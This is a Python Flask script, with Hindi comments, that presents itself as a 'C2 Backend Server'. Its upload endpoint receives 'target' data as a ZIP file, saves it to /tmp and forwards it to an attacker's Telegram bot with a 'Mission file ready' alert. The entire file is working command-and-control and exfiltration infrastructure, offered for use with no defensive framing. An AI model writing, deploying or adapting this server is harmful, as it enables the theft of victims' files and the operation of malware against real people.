import os
import logging
from flask import Flask, request
import requests

# लॉगिंग सेटप ताकि सर्वर पर अगर कुछ गड़बड़ हो तो तुरंत पता चल जाए
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Render के एनवायरनमेंट वेरिएबल्स से सुरक्षित रूप से क्रेडेंशियल्स उठाना
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

@app.route('/')
def home():
    return "C2 Backend Server is Active & Running Securely.", 200

@app.route('/upload', methods=['POST'])
def receive_data():
    try:
        # चेक करना कि फाइल रिक्वेस्ट में आई है या नहीं
        if 'file' not in request.files:
            logger.warning("No file part in the request.")
            return "No file found", 400
        
        file = request.files['file']
        
        if file.filename == '':
            logger.warning("No selected file.")
            return "No selected file", 400

        # टारगेट के डेटा को टेंपररी सेव करना
        file_path = "/tmp/target_data.zip"
        file.save(file_path)
        logger.info("Target ZIP file successfully received and saved locally.")

        # टेलीग्राम बॉट पर ज़िप फाइल भेजने की एपीआई रिक्वेस्ट
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': '🎯 [ALERT] Target Data Received Successfully! Mission file ready.'
            }
            files = {'document': f}
            
            response = requests.post(telegram_url, data=payload, files=files)
            
        if response.status_code == 200:
            logger.info("Data successfully forwarded to Jaro's Telegram Bot!")
            return "Success", 200
        else:
            logger.error(f"Telegram API Error: {response.text}")
            return "Telegram delivery failed", 500

    except Exception as e:
        logger.exception(f"An unexpected error occurred: {str(e)}")
        return f"Internal Server Error: {str(e)}", 500

if __name__ == '__main__':
    # सर्वर को 0.0.0.0 पोर्ट पर रन करना
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
